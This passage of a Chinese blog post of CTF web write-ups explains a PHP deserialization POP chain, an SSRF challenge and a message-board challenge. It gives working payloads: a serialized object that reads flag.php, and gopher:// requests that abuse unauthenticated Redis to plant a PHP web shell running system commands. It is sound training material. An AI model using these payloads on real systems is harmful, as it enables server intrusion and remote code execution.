    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>三个类</p>
<p><code>Modifier</code>，<code>Show</code>，<code>Test</code></p>
<p>逐个分析，首先路口题目给了从<code>Show</code>，可能不对，但还是先从<code>Show</code>看</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Welcome to '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>三个魔术方法</p>
<pre class="language-php" data-language="php"><code class="language-php">__construct：当一个对象创建时调用
__toString：当一个对象被当作一个字符串被调用
__wakeup：反序列化时触发</code></pre>

<p>从<code>Show</code>入口，会调用<code>__wakeup</code>魔术方法，方法里将<code>$this-&gt;source</code>做字符串在<code>preg_match</code>函数里比较， 如果<code>$this-&gt;source</code>是Show类，这时会调用<code>__toString</code>方法。</p>
<p>再看<code>Modifier</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>一个魔术方法</p>
<pre class="language-none"><code class="language-none">__invoke：将对象调用为函数时触发</code></pre>

<p>很明显的文件包含<code>include</code>，这个类就是最终要读取<code>flag.php</code>的时候使用的了，我们要让<code>Modifier</code>被当做函数调用，这时就会调用<code>__invoke</code>方法，从而调用<code>append</code>函数，进行文件包含。</p>
<p>最后看<code>Test</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>两个魔术方法</p>
<pre class="language-none"><code class="language-none">__construct：当一个对象创建时调用
__get：用于从不可访问的属性读取数据</code></pre>

<p>很关键的<code>__get</code>魔术方法，这里会返回<code>$this-&gt;p</code>即<code>$function()</code>作为函数调用，而我们恰好需要让<code>Modifier</code>被当做函数调用，只要在<code>Show</code>里实例化<code>Test</code>类，这样一来一条pop链就形成了。</p>
<h6 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h6><p>从<code>Show</code>入手，先反序列化函数触发<code>Show</code>类中<code>__wakeup</code>方法，方法内调用函数触发<code>__tosring</code>方法，<code>__tosring</code>中将<code>str</code>实例化为<code>Test</code>类，而<code>Test</code>类中没有<code>source</code>属性，所以会调用<code>__get</code>方法， 将<code>function</code>实例化为<code>Modifier</code>类，触发<code>Modifier</code>中的<code>__invoke</code>方法，最终调用<code>include</code>函数文件包含<code>flag.php</code></p>
<p>payload:</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string double-quoted-string">"php://filter/convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string double-quoted-string">"123"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//Show()->__wakeup()->__tostring()->str->Test->__get()->Modefier->__invoke()->"flag.php"</span>

<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">;</span>
<span class="token comment">//O:4:"Show":2:&#123;s:6:"source";O:4:"Show":2:&#123;s:6:"source";s:3:"123";s:3:"str";O:4:"Test":1:&#123;s:1:"p";O:8:"Modifier":1:&#123;s:6:" * var";s:52:"php://filter/convert.base64-encode/resource=flag.php";&#125;&#125;&#125;s:3:"str";N;&#125;</span>

<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A3%3A%22123%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span>
</span></code></pre>

<p>这里还有小注意点，题目中的php版本为 5.6.40 ，这个版本反序列化对于<code>protected</code>与<code>public</code>类别还是敏感的，可以看到这里是有<code>%00</code>存在的</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201218135255308.png" class="" title="image-20201218135255308" loading="lazy">

<p>可见字符4个，前后都是<code>%00</code>，这时通过数据表传参可能会不准确，例如我本地调会显示如下</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201218135449017.png" class="" title="image-20201218135449017" loading="lazy">

<img src="/article/Buuoj-WEB-Write-up/image-20201218135521199.png" class="" title="image-20201218135521199" loading="lazy">

<img src="/article/Buuoj-WEB-Write-up/image-20201218135543020.png" class="" title="image-20201218135543020" loading="lazy">

<p>所以我们最后进行<code>urlencode</code>，保证<code>%00</code>正常传入</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201218135722862.png" class="" title="image-20201218135722862" loading="lazy">

<p>最后包含<code>flag.php</code>，拿到flag</p>
<hr>
<h2 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h2><h5 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h5><p>打开题目</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201223182110711.png" class="" title="image-20201223182110711" loading="lazy">

<p>跟url有关，可能是ssrf，命令执行等，先输入<code>127.0.0.1&amp;whoami</code></p>
<img src="/article/Buuoj-WEB-Write-up/image-20201223182233706.png" class="" title="image-20201223182233706" loading="lazy">

<p>被ban，查看源码发现提示<code>?secret</code></p>
<img src="/article/Buuoj-WEB-Write-up/image-20201223182323977.png" class="" title="image-20201223182323977" loading="lazy">

<p>发现是linux命令<code>ifconfig</code>内容，考点应该是ssrf打内网</p>
<p>尝试用<code>file:/</code>读取文件发现被ban，使用 <code>file：/</code>、<code>file:&lt;空格&gt;///</code> 绕过</p>
<p>读到源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token comment">//echo $url."\n";</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">,</span><span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span>
			<span class="token comment">//var_dump($match);</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'别这样'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ifconfig'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>ban了<code>file://</code>，<code>dict://</code>，<code>127.0.0.1</code>和<code>localhost</code>，应该是要找本机的服务，爆破下内网同网段下存活主机</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201223182749451.png" class="" title="image-20201223182749451" loading="lazy">

<img src="/article/Buuoj-WEB-Write-up/image-20201223182807801.png" class="" title="image-20201223182807801" loading="lazy">

<p>在<code>10.138.132.10</code>发现提示，爆破其端口，猜测为mysql，redis之类的服务</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201223184447546.png" class="" title="image-20201223184447546" loading="lazy">

<p>在6379端口发现异常，至此明白为redis漏洞</p>
<p>尝试打redis未授权访问漏洞</p>
<p>payload:</p>
<pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//10.138.132.10:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2440%0D%0A%0A%0A%3C%3Fphp%20system%28%22find%20/%20-name%20fla%2A%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span></code></pre>

<p>在目标主机上生成<code>shell.php</code>，扫描<code>fla*</code>，以确定flag位置</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201223184856356.png" class="" title="image-20201223184856356" loading="lazy">

<p>排除其他可能，确认flag在根目录，再打</p>
<pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//10.138.132.10:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span></code></pre>

<p><code>cat /flag</code></p>
<img src="/article/Buuoj-WEB-Write-up/image-20201223185801498.png" class="" title="image-20201223185801498" loading="lazy">



<hr>
<h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a><a href="/article/Buuoj-WEB-Write-up/#Comment">[网鼎杯 2018]Comment</a></h2><p>打开题目为留言板，猜测SSTI，sql注入之类的。</p>
<p>随便留言后跳转登陆界面，sql注入测试无果，看框内字符串，弱密码爆破一波</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201223193659732.png" class="" title="image-20201223193659732" loading="lazy">

<img src="/article/Buuoj-WEB-Write-up/image-20201223203540497.png" class="" title="image-20201223203540497" loading="lazy">

<p>爆破密码为<code>zhangwei666</code></p>
<p>进去尝试SSTI,sql注入无果，但是sql注入语句被过滤。</p>
<p>站内查找，发现git泄露</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201223201810099.png" class="" title="image-20201223201810099" loading="lazy">

<p><code>writr_do.php</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"mysql.php"</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">case</span> <span class="token string single-quoted-string">'write'</span><span class="token punctuation">:</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token keyword">case</span> <span class="token string single-quoted-string">'comment'</span><span class="token punctuation">:</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token keyword">default</span><span class="token punctuation">:</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>
</code></pre>

<p>看起来代码肯定是删过的</p>
<p>然后发现其实原来需要git log 恢复，不得不说，git_extract真香，直接扒出原先的源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"mysql.php"</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">case</span> <span class="token string single-quoted-string">'write'</span><span class="token punctuation">:</span>
    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into board
            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',
                title = '<span class="token interpolation"><span class="token variable">$title</span></span>',
                content = '<span class="token interpolation"><span class="token variable">$content</span></span>'"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token keyword">case</span> <span class="token string single-quoted-string">'comment'</span><span class="token punctuation">:</span>
    <span class="token variable">$bo_id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bo_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select category from board where id='<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into comment
            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',
                content = '<span class="token interpolation"><span class="token variable">$content</span></span>',
                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./comment.php?id=<span class="token interpolation"><span class="token variable">$bo_id</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token keyword">default</span><span class="token punctuation">:</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
